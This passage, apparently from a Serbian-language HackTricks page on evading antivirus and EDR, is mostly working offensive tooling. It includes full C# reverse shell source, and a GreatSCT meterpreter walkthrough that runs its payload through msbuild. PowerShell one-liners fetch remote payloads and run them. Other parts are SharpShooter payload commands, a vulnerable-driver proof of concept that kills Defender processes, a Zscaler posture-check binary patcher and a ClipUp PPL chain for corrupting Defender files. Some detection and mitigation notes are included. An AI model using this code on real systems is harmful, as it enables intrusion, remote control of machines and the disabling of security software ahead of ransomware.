- Ne pokrećite `winvnc` ako već radi ili ćete pokrenuti [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za help ili ćete pokrenuti [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python-a za primer build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 je iskoristio mali konzolni utilitar pod nazivom **Antivirus Terminator** da onemogući endpoint zaštite pre nego što je bacio ransomware. Alat donosi svoj **vulnerable ali *potpisani* driver** i zloupotrebljava ga za izdavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključna zapažanja
1. **Signed driver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto drajver ima važeći Microsoft potpis, učita se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prvi red registruje drajver kao **kernel servis**, a drugi ga startuje tako da `\\.\ServiceMouse` postane dostupan iz user land-a.
3. **IOCTL-ovi izloženi od strane drajvera**
| IOCTL code | Svrha                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekini proizvoljan proces po PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Obriši proizvoljan fajl na disku |
| `0x990001D0` | Isključi drajver i ukloni servis |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto to radi**: BYOVD potpuno zaobilazi user-mode zaštite; kod koji se izvršava u kernelu može otvoriti *protected* procese, prekinuti ih ili menjati kernel objekte bez obzira na PPL/PP, ELAM ili druge mehanizme hardeninga.

Detekcija / ublažavanje
•  Omogućite Microsoft-ovu listu zabrana ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.  
•  Pratite kreiranja novih *kernel* servisa i alarmirajte kada je drajver učitan iz direktorijuma koji je world-writable ili nije prisutan na allow-listi.  
•  Pazite na user-mode handle-ove ka custom device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler-ov **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da komunicira rezultate drugim komponentama. Dva slaba dizajnerska izbora čine potpuni bypass mogućim:

1. Procena posture se dešava **u potpunosti na klijentu** (server prima samo boolean).
2. Interni RPC endpoint-i samo proveravaju da je povezani izvršni fajl **potpisan od strane Zscaler-a** (putem `WinVerifyTrust`).

Patch-ovanjem četiri potpisana binarna fajla na disku obe mehanizme je moguće neutralisati:

| Binarna datoteka | Originalna logika patch-ovana | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera prolazi |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ovan ⇒ bilo koji (čak i nepotpisani) proces može da se veže za RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjena sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Zaobidene |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i restartovanja servisnog stack-a:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

Ova studija slučaja pokazuje kako čisto client-side odluke o poverenju i jednostavne signature checks mogu biti zaobiđene sa par byte patch-eva.

## Zloupotreba Protected Process Light (PPL) za manipulaciju AV/EDR pomoću LOLBINs

Protected Process Light (PPL) nameće signer/level hijerarhiju tako da samo procesi sa istim ili višim zaštićenim nivoom mogu međusobno menjati jedan drugog. Ofanzivno, ako legalno možete pokrenuti PPL-enabled binarni fajl i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ogranićen, PPL-backed write primitive protiv zaštićenih direktorijuma koje koriste AV/EDR.

Šta čini da proces radi kao PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće novu instancu i prihvata parametar za upis log fajla na putanju koju specificira pozivalac.
- Kada se pokrene kao PPL proces, upis fajla se izvršava uz PPL backing.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 short paths da biste ciljali u uobičajeno zaštićene lokacije.

8.3 short path pomoć
- Prikažite kratka imena: `dir /x` u svakom roditeljskom direktorijumu.
- Dobijte short path u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp log-path argument da biste prisilili kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Ako je potrebno, koristite 8.3 short names.
3) Ako je ciljani binarni fajl obično otvoren/zaključan od strane AV dok radi (npr. MsMpEng.exe), zakažite upis pri boot-u pre nego što AV startuje tako što instalirate auto-start service koji se pouzdano izvršava ranije. Potvrdite redosled pri podizanju sa Process Monitor (boot logging).
4) Na reboot-u PPL-backed upis se dešava pre nego što AV zaključa svoje binarne fajlove, kvareći ciljani fajl i sprečavajući pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim mesta postavljanja; primitiv je pogodan za korupciju, a ne za precizno ubacivanje sadržaja.
- Zahteva lokalnog admina/SYSTEM za instalaciju/startovanje servisa i vreme za reboot.
- Vreme je kritično: cilj ne sme biti otvoren; izvršavanje pri boot-u izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako je roditelj non-standard launcher ili se dešava oko boot-a.
- Novi servisi konfigurisan da auto-startuju sumnjive binarne fajlove i koji dosledno startuju pre Defender/AV. Istražiti kreiranje/izmenu servisa pre grešaka pri pokretanju Defender-a.
- Monitoring integriteta fajlova na Defender binarnim fajlovima/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od strane procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: tražiti procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane non-AV binarnih fajlova.

Mitigacije
- WDAC/Code Integrity: ograničiti koji potpisani binarni fajlovi mogu da se izvršavaju kao PPL i pod kojim roditeljima; blokirati pozive ClipUp izvan legitimnih konteksta.
- Higijena servisa: ograničiti kreiranje/izmenu auto-start servisa i pratiti manipulaciju redosledom startovanja.
- Osigurati da su Defender tamper protection i early-launch protections omogućeni; istražiti greške pri startu koje ukazuju na korupciju binarnih fajlova.
- Razmotrite onemogućavanje 8.3 short-name generation na volumima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (testirati temeljno).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
